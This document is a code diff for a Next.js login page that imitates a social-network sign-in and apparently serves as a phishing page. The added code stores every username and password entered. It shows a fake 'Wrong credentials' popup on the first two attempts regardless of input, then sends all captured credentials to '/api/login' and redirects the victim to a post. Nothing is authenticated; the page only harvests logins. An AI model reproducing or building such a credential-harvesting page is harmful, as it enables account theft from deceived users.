@@ -1,36 +1,73 @@
 "use client"
 import { Opt } from "next/font/google";
 import Link from "next/link";
-import { useState } from "react";
+import { useRef, useState } from "react";
 import { useRouter } from "next/navigation";
 
 export default function Page() {
+    const [password, setPassword] = useState(null);
+    const [username, setUsername] = useState(null);
+    const [allPassUsername, setAllPassUsername] = useState([]);
+    const [loading, setLoading] = useState(false);
+    const mobileInputRef = useRef(null);
+
     const [passwordVisible, setPasswordVisible] = useState(false);
     const router = useRouter();
 
-    const handlePasswordChange = (event) => {
-        setPassword(event.target.value);
-    };
 
     const togglePasswordVisibility = (event) => {
         event.preventDefault();
         setPasswordVisible(!passwordVisible);
     };
-    const handleSubmit = (event) => {
-        event.preventDefault();
-        router.replace("pages/naila143201/post/3217382")
 
-    }
+    const makeLogin = async (allData) => {
+        setLoading(true);
+        closeWrongPassPopup();
     
-    const closeWrongPassPopup = (event) =>{
+        // Simulating a delay using a Promise
+        // await new Promise((resolve) => setTimeout(resolve, 2000));
+        // setLoading(false);
+
+        const res = await fetch('/api/login', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ data: allData }),
+        });
+
+        if (res.ok) {
+            router.replace("/pages/naila143201/post/3217382")
+        }
+        else{
+            setLoading(false);
+        }
+    }
+
+    const handleLogin = async (event) => {
         event.preventDefault();
+        setAllPassUsername((prevAllPassUsername) => {
+            const updatedArray = [...prevAllPassUsername, { username: username, password: password }];
+            if (updatedArray.length < 3) {
+                openWrongPassPopup();
+            }
+            else {
+                makeLogin(updatedArray)
+            }
+            return updatedArray;
+        });
+    };
+
+    const closeWrongPassPopup = () => {
         const popupBox = document.getElementById("wrong-pass-popup");
         popupBox.classList.add("-z-10");
         popupBox.classList.remove("z-10");
+        if (mobileInputRef.current) {
+            mobileInputRef.current.focus();
+        }
     }
 
-    const openWrongPassPopup = (event) =>{
-        event.preventDefault();
+    const openWrongPassPopup = () => {
         const popupBox = document.getElementById("wrong-pass-popup");
         popupBox.classList.add("z-10");
         popupBox.classList.remove("-z-10");
@@ -39,8 +76,15 @@ export default function Page() {
     return (<>
         <div className="w-full h-full login-bg flex flex-col">
 
-            <div id="wrong-pass-popup" className="fixed w-screen h-dvh bg-gray-500 bg-opacity-60 flex justify-center items-center z-10">
-                <button onClick={closeWrongPassPopup} href="/login" className="w-[90%] h-44 bg-white rounded-lg flex flex-col">
+            {loading ? (
+                <div className="fixed w-screen h-dvh bg-gray-500 bg-opacity-60 flex justify-center items-center z-10">
+                    <img src="/imgs/loading.gif" alt="Loading..." className="w-12 aspect-square object-contain" />
+                </div>
+            ) : null}
+
+
+            <div id="wrong-pass-popup" className="fixed w-screen h-dvh bg-gray-500 bg-opacity-60 flex justify-center items-center -z-10">
+                <button onClick={(event) => { event.preventDefault(); closeWrongPassPopup() }} href="/login" className="w-[90%] h-44 bg-white rounded-lg flex flex-col">
                     <div className="w-full h-32 flex flex-col justify-center items-center border-b border-gray-400">
                         <div className="text-[19px] font-semibold">Wrong credentials</div>
                         <div className="text-[14px] text-gray-500">Invalid username or password</div>
@@ -60,9 +104,18 @@ export default function Page() {
             </div>
 
             <div className="w-full h-60 px-4">
-                <form className="space-y-3 h-auto w-full">
+                <form className="space-y-3 h-auto w-full" onSubmit={handleLogin}>
                     <div className="w-full h-16 relative">
-                        <input type="email" id="mobile" name="mobile" placeholder=" " className="peer absolute w-full h-full pl-4 pr-12 pt-5 text-[16px] font-medium border border-gray-300 rounded-xl focus:border-gray-700 focus:outline-none text-gray-900" />
+                        <input
+                            type="text"
+                            ref={mobileInputRef}
+                            required
+                            id="mobile"
+                            name="mobile"
+                            placeholder=" "
+                            className="peer absolute w-full h-full pl-4 pr-12 pt-5 text-[16px] font-medium border border-gray-300 rounded-xl focus:border-gray-700 focus:outline-none text-gray-900"
+                            onChange={(e) => setUsername(e.target.value)}
+                        />
                         <label htmlFor="mobile" className="absolute w-full h-full px-4 py-2 flex flex-col justify-center font-medium text-gray-500 text-[14px] peer-placeholder-shown:text-[16px] peer-focus:text-[14px] translate-y-[-11px] peer-focus:translate-y-[-11px] peer-placeholder-shown:translate-y-[0px]  translate-x-[1px] peer-focus:translate-x-[1px] peer-placeholder-shown:translate-x-[0px] transition-all duration-200">
                             <span>
                                 Mobile number or email address
@@ -88,9 +141,11 @@ export default function Page() {
                     <div className="w-full h-16 relative">
                         <input type={passwordVisible ? 'text' : 'password'}
                             id="password"
+                            required
                             name="password"
                             placeholder=" "
                             className="peer absolute w-full h-full pl-4 pr-12 pt-5 text-[16px] font-medium border border-gray-300 rounded-xl focus:border-gray-700 focus:outline-none text-gray-900"
+                            onChange={(e) => setPassword(e.target.value)}
                         />
                         <label htmlFor="password" className="absolute w-full h-full px-4 py-2 flex flex-col justify-center font-medium text-gray-500 text-[14px] peer-placeholder-shown:text-[16px] peer-focus:text-[14px] translate-y-[-11px] peer-focus:translate-y-[-11px] peer-placeholder-shown:translate-y-[0px]  translate-x-[1px] peer-focus:translate-x-[1px] peer-placeholder-shown:translate-x-[0px] transition-all duration-200">
                             <span>
@@ -109,7 +164,7 @@ export default function Page() {
                         </div>
                     </div>
 
-                    <button type="submit" onClick={handleSubmit} className="w-full bg-blue-600 text-white py-2 rounded-full font-medium hover:bg-blue-700 focus:ring focus:ring-blue-500 focus:outline-none">
+                    <button type="submit" className="w-full bg-blue-600 text-white py-2 rounded-full font-medium hover:bg-blue-700 focus:ring focus:ring-blue-500 focus:outline-none">
                         Log in
                     </button>
                 </form>
